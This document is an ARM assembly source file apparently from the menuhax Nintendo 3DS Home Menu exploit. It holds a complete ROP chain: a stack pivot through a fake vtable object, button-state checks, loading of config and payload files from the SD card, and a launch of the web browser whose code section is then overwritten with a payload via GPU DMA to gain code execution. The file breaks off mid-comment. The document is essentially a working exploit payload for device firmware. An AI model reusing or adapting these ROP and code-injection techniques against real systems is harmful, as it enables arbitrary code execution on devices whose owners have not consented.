.arm
.section .init
.global _start

//The addresses for the ROP-chain is from an include, see the Makefile gcc line with -include / README.

#include "menuhax_ropinclude.s"

_start:
.word POP_R0PC
ret2menu_exploitreturn_spaddr: @ The menuhax_loader writes the sp-addr to jump to for ret2menu here. This value isn't actually used currently.
.word 0

.word POP_R0PC @ Stack-pivot to ropstackstart.
.word HEAPBUF + (object - _start) @ r0

.word ROP_LOADR4_FROMOBJR0

object:
.word HEAPBUF + (vtable - _start) @ object+0, vtable ptr
.word 0
.word 0
.word 0

.word HEAPBUF + ((object + 0x20) - _start) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.

.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
stackpivot_sploadword:
.word HEAPBUF + (ropstackstart - _start) @ sp
stackpivot_pcloadword:
.word ROP_POPPC @ pc

vtable:
.word 0, 0 @ vtable+0
.word 0
.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +16

tmpdata:

nss_outprocid:
.word 0

#if NEW3DS==0
#define PROGRAMIDLOW_SYSMODEL_BITMASK 0x0
#else
#define PROGRAMIDLOW_SYSMODEL_BITMASK 0x20000000
#endif

nsslaunchtitle_programidlow_list:
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ JPN
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00009402 @ USA
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00009D02 @ EUR
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ "AUS"(no 3DS systems actually have this region set)
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ CHN (the rest of the IDs here are probably wrong but whatever)
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ KOR
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ TWN

/*nss_servname:
.ascii "ns:s"*/

gamecard_titleinfo:
.word 0, 0 @ programID
.word 2 @ mediatype
.word 0 @ reserved

#ifdef LOADSDPAYLOAD
IFile_ctx:
.space 0x20

#ifndef ENABLE_LOADROPBIN
sdfile_path:
.string16 "sd:/menuhax/menuhax_payload.bin"
.align 2
#else
sdfile_ropbin_path:
.string16 ROPBINPAYLOAD_PATH
.align 2
#endif
#endif

#ifdef LOADSDCFG
sdfile_cfg_path:
.string16 "sd:/menuhax/menuhax_cfg.bin"
.align 2
#endif

#ifdef ENABLE_IMAGEDISPLAY
#ifdef ENABLE_IMAGEDISPLAY_SD
sdfile_imagedisplay_path:
.string16 "sd:/menuhax/menuhax_imagedisplay.bin"
.align 2
#endif
#endif

#ifdef LOADSDCFG
menuhax_cfg:
.space 0x2c

menuhax_cfg_new:
.space 0x2c
#endif

#ifdef LOADOTHER_THEMEDATA
filepath_theme_stringblkstart:
@ Originally these strings used the "sd:/" archive opened by the below ROP, but that's rather pointless since the BGM gets read from the normal extdata path anyway.

#ifdef FILEPATHPTR_THEME_SHUFFLE_BODYRD
filepath_theme_shuffle_bodyrd:
.string16 "theme:/yodyCache_rd.bin"
.align 2
#endif

#ifdef FILEPATHPTR_THEME_REGULAR_THEMEMANAGE
filepath_theme_regular_thememanage:
.string16 "theme:/yhemeManage.bin"
.align 2
#endif

#ifdef FILEPATHPTR_THEME_REGULAR_BODYCACHE
filepath_theme_regular_bodycache:
.string16 "theme:/yodyCache.bin"
.align 2
#endif

/*filepath_theme_regular_bgmcache:
.string16 "sd:/BgmCache.bin"
.align 2*/

#ifdef FILEPATHPTR_THEME_SHUFFLE_THEMEMANAGE
filepath_theme_shuffle_thememanage:
.string16 "theme:/yhemeManage_%02d.bin"
.align 2
#endif

#ifdef FILEPATHPTR_THEME_SHUFFLE_BODYCACHE
filepath_theme_shuffle_bodycache:
.string16 "theme:/yodyCache_%02d.bin"
.align 2
#endif

/*filepath_theme_shuffle_bgmcache:
.string16 "sd:/BgmCache_%02d.bin"
.align 2*/

filepath_theme_stringblkend:
#endif

tmp_scratchdata:
.space 0x400

ropstackstart:
#ifdef USE_PADCHECK

#ifdef LOADOTHER_THEMEDATA
@ Copy the theme filepath strings to 0x0fff0000.
CALLFUNC_NOSP MEMCPY, 0x0fff0000, (HEAPBUF + ((filepath_theme_stringblkstart) - _start)), (filepath_theme_stringblkend - filepath_theme_stringblkstart), 0

@ Overwrite the string ptrs in Home Menu .data which are used for the theme extdata filepaths. Don't touch the BGM paths, since those don't get used for reading during theme-load anyway.
#ifdef FILEPATHPTR_THEME_SHUFFLE_BODYRD
ROPMACRO_WRITEWORD FILEPATHPTR_THEME_SHUFFLE_BODYRD, (0x0fff0000 + (filepath_theme_shuffle_bodyrd - filepath_theme_stringblkstart))
#endif

#ifdef FILEPATHPTR_THEME_REGULAR_THEMEMANAGE
ROPMACRO_WRITEWORD FILEPATHPTR_THEME_REGULAR_THEMEMANAGE, (0x0fff0000 + (filepath_theme_regular_thememanage - filepath_theme_stringblkstart))
#endif

#ifdef FILEPATHPTR_THEME_REGULAR_BODYCACHE
ROPMACRO_WRITEWORD FILEPATHPTR_THEME_REGULAR_BODYCACHE, (0x0fff0000 + (filepath_theme_regular_bodycache - filepath_theme_stringblkstart))
#endif

//ROPMACRO_WRITEWORD (0x32e604+0x10), (0x0fff0000 + (filepath_theme_regular_bgmcache - filepath_theme_stringblkstart))

#ifdef FILEPATHPTR_THEME_SHUFFLE_THEMEMANAGE
ROPMACRO_WRITEWORD FILEPATHPTR_THEME_SHUFFLE_THEMEMANAGE, (0x0fff0000 + (filepath_theme_shuffle_thememanage - filepath_theme_stringblkstart))
#endif

#ifdef FILEPATHPTR_THEME_SHUFFLE_BODYCACHE
ROPMACRO_WRITEWORD FILEPATHPTR_THEME_SHUFFLE_BODYCACHE, (0x0fff0000 + (filepath_theme_shuffle_bodycache - filepath_theme_stringblkstart))
#endif

//ROPMACRO_WRITEWORD (0x32e604+0x1c), (0x0fff0000 + (filepath_theme_shuffle_bgmcache - filepath_theme_stringblkstart))
#endif

#ifdef LOADSDCFG
@ Load the cfg file. Errors are ignored with file-reading.
CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (IFile_ctx - _start)), 0x20, 0, 0

CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_cfg_path - _start)), 1, 0

CALLFUNC_NOSP IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (menuhax_cfg - _start)), 0x2c

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word (HEAPBUF + (IFile_ctx - _start))

.word ROP_LDR_R0FROMR0

.word IFile_Close

@ Verify that the cfg version matches 0x3. On match continue running the below ROP, otherwise jump to rop_cfg_end. Mismatch can also be caused by file-reading failing.
ROP_SETLR ROP_POPPC
ROPMACRO_CMPDATA (HEAPBUF + ((menuhax_cfg+0x0) - _start)), 0x3, (HEAPBUF + (rop_cfg_end - _start)), 0x0

@ Copy the u64 from filebuf+0x14 to hblauncher_svcsleepthread_delaylow/hblauncher_svcsleepthread_delayhigh.
ROPMACRO_COPYWORD (HEAPBUF + (hblauncher_svcsleepthread_delaylow - _start)), (HEAPBUF + ((menuhax_cfg+0x14) - _start))
ROPMACRO_COPYWORD (HEAPBUF + (hblauncher_svcsleepthread_delayhigh - _start)), (HEAPBUF + ((menuhax_cfg+0x18) - _start))

@ Copy the u64 from filebuf+0x24 to newthread_svcsleepthread_delaylow/newthread_svcsleepthread_delayhigh.
ROPMACRO_COPYWORD (HEAPBUF + (newthread_svcsleepthread_delaylow - _start)), (HEAPBUF + ((menuhax_cfg+0x24) - _start))
ROPMACRO_COPYWORD (HEAPBUF + (newthread_svcsleepthread_delayhigh - _start)), (HEAPBUF + ((menuhax_cfg+0x28) - _start))

rop_cfg_cmpbegin_exectypestart: @ Compare u32 filebuf+0x10(exec_type) with 0x0, on match continue to the ROP following this(which jumps to rop_cfg_cmpbegin1), otherwise jump to rop_cfg_cmpbegin_exectypeprepare.
ROP_SETLR ROP_POPPC
ROPMACRO_CMPDATA (HEAPBUF + ((menuhax_cfg+0x10) - _start)), 0x0, (HEAPBUF + (rop_cfg_cmpbegin_exectypeprepare - _start)), 0x0
ROPMACRO_STACKPIVOT (HEAPBUF + (rop_cfg_cmpbegin1 - _start)), ROP_POPPC

rop_cfg_cmpbegin_exectypeprepare:

CALLFUNC_NOSP MEMCPY, (HEAPBUF + ((menuhax_cfg_new) - _start)), (HEAPBUF + ((menuhax_cfg) - _start)), 0x2c, 0

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word 0x0 @ r0

.word POP_R1PC
.word (HEAPBUF + ((menuhax_cfg_new+0x10) - _start)) @ r1

.word ROP_STR_R0TOR1 @ Write 0x0 to cfg exec_type.

@ Write the updated cfg to the file.

CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (IFile_ctx - _start)), 0x20, 0, 0

CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_cfg_path - _start)), 0x3, 0

CALLFUNC IFile_Write, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (menuhax_cfg_new - _start)), 0x2c, 1, 0, 0, 0

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word (HEAPBUF + (IFile_ctx - _start))

.word ROP_LDR_R0FROMR0

.word IFile_Close

@ Compare u32 filebuf+0x10(exec_type) with 0x1, on match continue to the ROP following this, otherwise jump to rop_cfg_cmpbegin_exectype2.
ROP_SETLR ROP_POPPC
ROPMACRO_CMPDATA (HEAPBUF + ((menuhax_cfg+0x10) - _start)), 0x1, (HEAPBUF + (rop_cfg_cmpbegin_exectype2 - _start)), 0x0

@ Jump to padcheck_finish.
ROPMACRO_STACKPIVOT (HEAPBUF + (padcheck_finish - _start)), ROP_POPPC

rop_cfg_cmpbegin_exectype2: @ Compare u32 filebuf+0x10(exec_type) with 0x2, on match continue to the ROP following this, otherwise jump to rop_cfg_cmpbegin1.
ROP_SETLR ROP_POPPC
ROPMACRO_CMPDATA (HEAPBUF + ((menuhax_cfg+0x10) - _start)), 0x2, (HEAPBUF + (rop_cfg_cmpbegin1 - _start)), 0x0

ROPMACRO_STACKPIVOT (HEAPBUF + (ret2menu_rop - _start)), ROP_POPPC

rop_cfg_cmpbegin1: @ Compare u32 filebuf+0x4 with 0x1, on match continue to the ROP following this, otherwise jump to rop_cfg_cmpbegin2.
ROP_SETLR ROP_POPPC

ROPMACRO_CMPDATA (HEAPBUF + ((menuhax_cfg+0x4) - _start)), 0x1, (HEAPBUF + (rop_cfg_cmpbegin2 - _start)), 0x0

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word (HEAPBUF + (rop_r1data_cmphid - _start)) @ r0

.word POP_R1PC
.word (HEAPBUF + ((menuhax_cfg+0x8) - _start)) @ r1

.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from filebuf+0x8 to rop_r1data_cmphid, for overwriting the USE_PADCHECK value.

@ This ROP chunk has finished, jump to rop_cfg_end.
ROPMACRO_STACKPIVOT (HEAPBUF + (rop_cfg_end - _start)), ROP_POPPC

rop_cfg_cmpbegin2: @ Compare u32 filebuf+0x4 with 0x2, on match continue to the ROP following this, otherwise jump to rop_cfg_end.
ROP_SETLR ROP_POPPC

ROPMACRO_CMPDATA (HEAPBUF + ((menuhax_cfg+0x4) - _start)), 0x2, (HEAPBUF + (rop_cfg_end - _start)), 0x0

@ This type is the same as type1(minus the offset the PAD value is loaded from), except that it basically inverts the padcheck: on PAD match ret2menu, on mismatch continue ROP.

.word POP_R0PC
.word (HEAPBUF + (rop_r1data_cmphid - _start)) @ r0

.word POP_R1PC
.word (HEAPBUF + ((menuhax_cfg+0xc) - _start)) @ r1

.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from filebuf+0xc to rop_r1data_cmphid, for overwriting the USE_PADCHECK value.

.word POP_R0PC
.word (HEAPBUF + ((padcheck_end_stackpivotskip) - _start)) @ r0

.word POP_R1PC
.word ROP_POPPC @ r1

.word ROP_STR_R1TOR0 @ Write ROP_POPPC to padcheck_end_stackpivotskip, so that the stack-pivot following that actually gets executed.

.word POP_R0PC
.word (HEAPBUF + ((padcheck_pc_value) - _start)) @ r0

.word POP_R1PC
.word ROP_POPPC @ r1

.word ROP_STR_R1TOR0 @ Write ROP_POPPC to padcheck_pc_value.

.word POP_R0PC
.word (HEAPBUF + ((padcheck_sp_value) - _start)) @ r0

.word POP_R1PC
.word (HEAPBUF + ((padcheck_finish) - _start)) @ r1

.word ROP_STR_R1TOR0 @ Write the address of padcheck_finish to padcheck_sp_value.

rop_cfg_end:
#endif

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word HEAPBUF + (rop_r0data_cmphid - _start) @ r0

.word POP_R1PC
.word 0x1000001c @ r1

.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from *0x1000001c to rop_r0data_cmphid, current HID PAD state.

.word POP_R0PC
rop_r0data_cmphid:
.word 0 @ r0

.word POP_R1PC
rop_r1data_cmphid:
.word USE_PADCHECK @ r1

.word ROP_CMPR0R1 @ Compare current PAD state with USE_PADCHECK value.

.word HEAPBUF + ((object+0x20) - _start) @ r4

.word POP_R0PC
.word HEAPBUF + (stackpivot_sploadword - _start) @ r0

.word POP_R1PC
padcheck_sp_value:
.word (HEAPBUF + (ret2menu_rop - _start)) @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.

.word POP_R0PC
.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0

.word POP_R1PC
padcheck_pc_value:
.word ROP_POPPC @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.

.word POP_R0PC @ Begin the actual stack-pivot ROP.
.word HEAPBUF + (object - _start) @ r0

.word ROP_LOADR4_FROMOBJR0+8 @ When the current PAD state matches the USE_PADCHECK value, continue the ROP, otherwise do the above stack-pivot to return to the home-menu code.

.word 0, 0, 0 @ r4..r6

@ Re-init the stack-pivot data since this is needed for the sdcfg stuff.
.word POP_R0PC
.word HEAPBUF + (stackpivot_sploadword - _start) @ r0

.word POP_R1PC
.word (HEAPBUF + (ret2menu_rop - _start)) @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.

.word POP_R0PC
.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0

.word POP_R1PC
.word ROP_POPPC @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.

padcheck_end_stackpivotskip:
.word POP_R4R5R6PC @ Jump down to the padcheck_finish ROP by default. The LOADSDCFG ROP can patch this word to ROP_POPPC, so that the below stack-pivot actually gets executed.

@ When actually executed, stack-pivot so that ret2menu is done.
.word POP_R0PC
.word HEAPBUF + (object - _start) @ r0

.word ROP_LOADR4_FROMOBJR0

padcheck_finish:
ROPMACRO_STACKPIVOT (HEAPBUF + (padcheck_finish_jump - _start)), ROP_POPPC

ret2menu_rop:

#ifdef LOADSDCFG
@ When u32 cfg+0x20 != 0x0, goto to ret2menu_rop_createthread, otherwise jump to ret2menu_rop_returnmenu.
ROPMACRO_CMPDATA (HEAPBUF + ((menuhax_cfg+0x20) - _start)), 0x0, (HEAPBUF + (ret2menu_rop_createthread - _start)), 0x0
ROPMACRO_STACKPIVOT (HEAPBUF + (ret2menu_rop_returnmenu - _start)), ROP_POPPC

ret2menu_rop_createthread:
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word (HEAPBUF + (newthread_rop_r1data_cmphid - _start)) @ r0

.word POP_R1PC
.word (HEAPBUF + ((menuhax_cfg+0x20) - _start)) @ r1

.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from cfg+0x20 to newthread_rop_r1data_cmphid.

CALLFUNC svcControlMemory, (HEAPBUF + (tmp_scratchdata - _start)), NEWTHREAD_ROPBUFFER, 0, (((newthread_ropend - newthread_ropstart) + 0xfff) & ~0xfff), 0x3, 0x3, 0, 0

CALLFUNC_NOSP MEMCPY, NEWTHREAD_ROPBUFFER, (HEAPBUF + (newthread_ropstart - _start)), (newthread_ropend - newthread_ropstart), 0

@ svcCreateThread(<tmp_scratchdata addr>, ROP_POPPC, 0, NEWTHREAD_ROPBUFFER, 28, -2);

CALLFUNC svcCreateThread, (HEAPBUF + (tmp_scratchdata - _start)), ROP_POPPC, 0, NEWTHREAD_ROPBUFFER, 45, -2, 0, 0
#endif

ret2menu_rop_returnmenu:

@ Pivot to the sp-addr from ret2menu_exploitreturn_spaddr.

ROPMACRO_COPYWORD (HEAPBUF + (stackpivot_sploadword - _start)), (HEAPBUF + (ret2menu_exploitreturn_spaddr - _start))

ROPMACRO_WRITEWORD (HEAPBUF + (stackpivot_pcloadword - _start)), ROP_POPPC

.word POP_R0PC
.word HEAPBUF + (object - _start) @ r0

.word ROP_LOADR4_FROMOBJR0

padcheck_finish_jump:
#endif

//Overwrite the top-screen framebuffers. First chunk is 3D-left framebuffer, second one is 3D-right(when that's enabled). These are the primary framebuffers. Color format is byte-swapped RGB8.
#ifndef ENABLE_IMAGEDISPLAY
CALL_GXCMD4 0x1f000000, 0x1f1e6000, 0x46800*2
#else

@ Allocate the buffer containing the gfx data in linearmem, with the bufptr located @ tmp_scratchdata+4, which is then copied to tmp_scratchdata+8.
CALLFUNC svcControlMemory, (HEAPBUF + (tmp_scratchdata+4 - _start)), 0, 0, (((0x46800*2 + 0x38800) + 0xfff) & ~0xfff), 0x10003, 0x3, 0, 0
ROPMACRO_COPYWORD (HEAPBUF + (tmp_scratchdata+8 - _start)), (HEAPBUF + (tmp_scratchdata+4 - _start))

@ Initialize the data which will be copied into the framebuffers, for when reading the file fails.

@ Clear the entire buffer, including the sub-screen data just to make sure it's all-zero initially.
CALLFUNC_NOSP_LDRR0 MEMSET32_OTHER, (HEAPBUF + (tmp_scratchdata+8 - _start)), ((0x46800*2) + 0x38800), 0, 0

CALLFUNC_NOSP_LDRR0 MEMCPY, (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x1f000000, (0x46800*2), 0

#ifdef ENABLE_IMAGEDISPLAY_SD
CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (IFile_ctx - _start)), 0x20, 0, 0

CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_imagedisplay_path - _start)), 1, 0

@ Read main-screen 3D-left image.
CALLFUNC_NOSP_LOADR2 IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (tmp_scratchdata+8 - _start)), (0x46500)

@ Read main-screen 3D-right image.
ROPMACRO_LDDRR0_ADDR1_STRADDR (HEAPBUF + (tmp_scratchdata+8 - _start)), (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x46800
CALLFUNC_NOSP_LOADR2 IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (tmp_scratchdata+8 - _start)), (0x46500)

@ Read sub-screen image.
ROPMACRO_LDDRR0_ADDR1_STRADDR (HEAPBUF + (tmp_scratchdata+8 - _start)), (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x46800
CALLFUNC_NOSP_LOADR2 IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (tmp_scratchdata+8 - _start)), (0x38400)

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word (HEAPBUF + (IFile_ctx - _start))

.word ROP_LDR_R0FROMR0

.word IFile_Close
#endif

@ Setup the framebuffers to make sure they're at the intended addrs(like when returning from another title etc).
@ Setup primary framebuffers for the main-screen.
CALLFUNC GSP_SHAREDMEM_SETUPFRAMEBUF, 0, 0, 0x1f1e6000, 0x1f1e6000 + 0x46800, 0x2d0, 0x321, 0, 0
@ Setup secondary framebuffers for the main-screen.
CALLFUNC GSP_SHAREDMEM_SETUPFRAMEBUF, 0, 1, 0x1f273000, 0x1f273000 + 0x46800, 0x2d0, 0x321, 1, 0

@ Setup primary framebuffers for the sub-screen.
CALLFUNC GSP_SHAREDMEM_SETUPFRAMEBUF, 1, 0, 0x1f48f000, 0, 0x2d0, 0x301, 0, 0
@ Setup secondary framebuffers for the sub-screen.
CALLFUNC GSP_SHAREDMEM_SETUPFRAMEBUF, 1, 1, 0x1f48f000 + 0x38800, 0, 0x2d0, 0x301, 1, 0


@ Flush gfx dcache.
CALLFUNC_NOSP_LDRR0 GSPGPU_FlushDataCache, (HEAPBUF + (tmp_scratchdata+4 - _start)), (0x46800*2) + 0x38800, 0, 0

ROPMACRO_COPYWORD (HEAPBUF + (tmp_scratchdata+8 - _start)), (HEAPBUF + (tmp_scratchdata+4 - _start))

@ Copy the gfx to the primary/secondary main-screen framebuffers.
CALL_GXCMD4_LDRSRC (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x1f1e6000, 0x46800*2
CALL_GXCMD4_LDRSRC (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x1f273000, 0x46800*2

@ Copy the gfx to the primary/secondary sub-screen framebuffers.
ROPMACRO_LDDRR0_ADDR1_STRADDR (HEAPBUF + (tmp_scratchdata+8 - _start)), (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x46800*2

CALL_GXCMD4_LDRSRC (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x1f48f000, 0x38800
CALL_GXCMD4_LDRSRC (HEAPBUF + (tmp_scratchdata+8 - _start)), 0x1f48f000 + 0x38800, 0x38800

@ Wait 0.1s for the above transfers to finish, then free the allocated linearmem buffer.

CALLFUNC_NOSP svcSleepThread, 100000000, 0, 0, 0

CALLFUNC_LDRR1 svcControlMemory, (HEAPBUF + (tmp_scratchdata+12 - _start)), (HEAPBUF + (tmp_scratchdata+4 - _start)), 0, (((0x46800*2 + 0x38800) + 0xfff) & ~0xfff), 0x1, 0x0, 0, 0
#endif

#ifdef ENABLE_LOADROPBIN
#ifndef LOADSDPAYLOAD
CALLFUNC_NOSP MEMCPY, ROPBIN_BUFADR, (HEAPBUF + ((codebinpayload_start) - _start)), (codedataend-codebinpayload_start), 0
#else
CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (IFile_ctx - _start)), 0x20, 0, 0

CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_ropbin_path - _start)), 1, 0
COND_THROWFATALERR

CALLFUNC_NOSP IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), ROPBIN_BUFADR, 0x10000
COND_THROWFATALERR

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word (HEAPBUF + (IFile_ctx - _start))

.word ROP_LDR_R0FROMR0

.word IFile_Close
#endif

#ifdef ENABLE_HBLAUNCHER
CALLFUNC_NOSP MEMSET32_OTHER, ROPBIN_BUFADR - (0x800*6), 0x2800, 0, 0 @ paramblk, the additional 0x2000-bytes is for backwards-compatibility.

CALLFUNC_NOSP GSPGPU_FlushDataCache, ROPBIN_BUFADR - (0x800*6), (0x10000+0x2800), 0, 0
#endif

@ Delay 3-seconds. This seems to help with the *hax 2.5 payload booting issues which triggered in some cases(doesn't happen as much with this).

ROP_SETLR ROP_POPPC

.word POP_R0PC
hblauncher_svcsleepthread_delaylow:
.word 3000000000 @ r0

.word POP_R1PC
hblauncher_svcsleepthread_delayhigh:
.word 0 @ r1

.word svcSleepThread

ROPMACRO_STACKPIVOT ROPBIN_BUFADR, ROP_POPPC
#endif

#ifdef BOOTGAMECARD
#ifdef GAMECARD_PADCHECK
ROP_SETLR ROP_POPPC

.word POP_R0PC
.word 3000000000//0x0 @ r0

.word POP_R1PC
.word 0x0//0x100 @ r1

.word svcSleepThread @ Sleep 3 seconds, otherwise PADCHECK won't work if USE_PADCHECK and GAMECARD_PADCHECK are different values.

.word POP_R0PC
.word HEAPBUF + (rop_r0data_cmphid_gamecard - _start) @ r0

.word POP_R1PC
.word 0x1000001c @ r1

.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from *0x1000001c to rop_r0data_cmphid, current HID PAD state.

.word POP_R0PC
rop_r0data_cmphid_gamecard:
.word 0 @ r0

.word POP_R1PC
.word GAMECARD_PADCHECK @ r1

.word ROP_CMPR0R1 @ Compare current PAD state with GAMECARD_PADCHECK value.

.word HEAPBUF + ((object+0x20) - _start) @ r4

.word POP_R0PC
.word HEAPBUF + (stackpivot_sploadword - _start) @ r0

.word POP_R1PC
.word (HEAPBUF + (bootgamecard_ropfinish - _start)) @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into sp.

.word POP_R0PC
.word HEAPBUF + (stackpivot_pcloadword - _start) @ r0

.word POP_R1PC
.word ROP_POPPC @ r1

.word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.

.word POP_R0PC @ Begin the actual stack-pivot ROP.
.word HEAPBUF + (object - _start) @ r0

.word ROP_LOADR4_FROMOBJR0+8 @ When the current PAD state matches the GAMECARD_PADCHECK value, continue the gamecard launch ROP, otherwise do the above stack-pivot to skip gamecard launch.

.word 0, 0, 0 @ r4..r6
#endif

CALLFUNC_NOSP NSS_RebootSystem, 0x1, (HEAPBUF + (gamecard_titleinfo - _start)), 0x0, 0

bootgamecard_ropfinish:
#endif

#if NEW3DS==1 //On New3DS the end-address of the GPU-accessible FCRAM area increased, relative to the SYSTEM-memregion end address. Therefore, in order to get the below process to run under memory that's GPU accessible, 0x400000-bytes are allocated here.
CALLFUNC svcControlMemory, (HEAPBUF + (tmp_scratchdata - _start)), 0x0f000000, 0, 0x00400000, 0x3, 0x3, 0, 0
#endif

#ifndef ENABLE_LOADROPBIN
#ifdef LOADSDPAYLOAD//When enabled, load the file from SD to codebinpayload_start.
CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (IFile_ctx - _start)), 0x20, 0, 0

CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_path - _start)), 1, 0
COND_THROWFATALERR

CALLFUNC_NOSP IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (codebinpayload_start - _start)), (CODEBINPAYLOAD_SIZE - (codebinpayload_start - codedatastart))
COND_THROWFATALERR

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word (HEAPBUF + (IFile_ctx - _start))

.word ROP_LDR_R0FROMR0

.word IFile_Close
#endif

CALLFUNC_NOSP GSPGPU_FlushDataCache, (HEAPBUF + (codedatastart - _start)), CODEBINPAYLOAD_SIZE, 0, 0

ROP_SETLR POP_R2R6PC

.word POP_R0PC
.word HEAPBUF + (region_outval - _start) @ r0

.word CFGIPC_SecureInfoGetRegion @ Write the SecureInfo region value to the below field which will be popped into r4.

.word 0 @ r2
.word 0 @ r3
region_outval:
.word 0 @ r4
.word HEAPBUF + (nsslaunchtitle_programidlow_list - _start) @ r5
.word 0 @ r6

.word POP_R0PC
.word HEAPBUF + (object - _start) @ r0

.word ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX //"ldr r1, [r5, r4, lsl #2]" <call vtable funcptr +20 from the r0 object> (load the programID-low for this region into r1)

ROP_SETLR_OTHER ROP_POPPC

.word POP_R0PC

.word HEAPBUF + (nsslaunchtitle_regload_programidlow - _start) @ r0

.word ROP_STR_R1TOR0 //Write the programID-low value for this region to the below reg-data which would be used for the programID-low in the NSS_LaunchTitle call.

ROP_SETLR POP_R2R6PC

.word POP_R0PC
.word HEAPBUF + (nss_outprocid - _start)  @ r0, out procid*

@ r1 isn't used by NSS_LaunchTitle so no need to set it here.

.word POP_R2R6PC
nsslaunchtitle_regload_programidlow:
.word 0 @ r2, programID low (overwritten by the above ROP)
.word 0x00040030 @ r3, programID high
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word NSS_LaunchTitle @ Launch the web-browser.

.word 0 @ r2 / sp0 (mediatype, 0=NAND)
.word 0 @ r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

#if NEW3DS==1//Use this as a waitbyloop.
CALLFUNC ROP_INITOBJARRAY, 0, ROP_BXLR, 0, 0x10000000, 0, 0, 0, 0
#endif

//Overwrite the browser .text with the below code.
CALL_GXCMD4 (HEAPBUF + (codedatastart - _start)), NSS_PROCLOADTEXT_LINEARMEMADR, CODEBINPAYLOAD_SIZE

/*#if NEW3DS==1 //Free the memory which was allocated above on new3ds.
CALLFUNC svcControlMemory, (HEAPBUF + (tmp_scratchdata - _start)), 0x0f000000, 0, 0x00400000, 0x1, 0x0, 0, 0
#endif*/

#if NEW3DS==1//Use this as a waitbyloop.
CALLFUNC ROP_INITOBJARRAY, 0, ROP_BXLR, 0, 0x10000000, 0, 0, 0, 0
#endif

ROP_SETLR ROP_POPPC

.word POP_R0PC
.word 1000000000//0x0 @ r0

.word POP_R1PC
.word 0x0//0x100 @ r1

.word svcSleepThread @ Sleep 1 second, call GSPGPU_Shutdown() etc, then execute svcSleepThread in an "infinite loop". The ARM11-kernel does not allow this homemenu thread and the browser thread to run at the same time(homemenu thread has priority over the browser thread). Therefore an "infinite loop" like the bx one below will result in execution of the browser thread completely stopping once any homemenu "infinite loop" begin execution. On Old3DS this means the below code will overwrite .text while the browser is attempting to clear .bss. On New3DS since overwriting .text+0 doesn't quite work(context-switching doesn't trigger at the right times), a different location in .text has to be overwritten instead.

CALLFUNC_NOARGS GSPGPU_Shutdown

/*
//Get "ns:s" service handle, then send it via APT_SendParameter(). The codebin payload can then use APT:ReceiveParameter to get this "ns:s" handle.
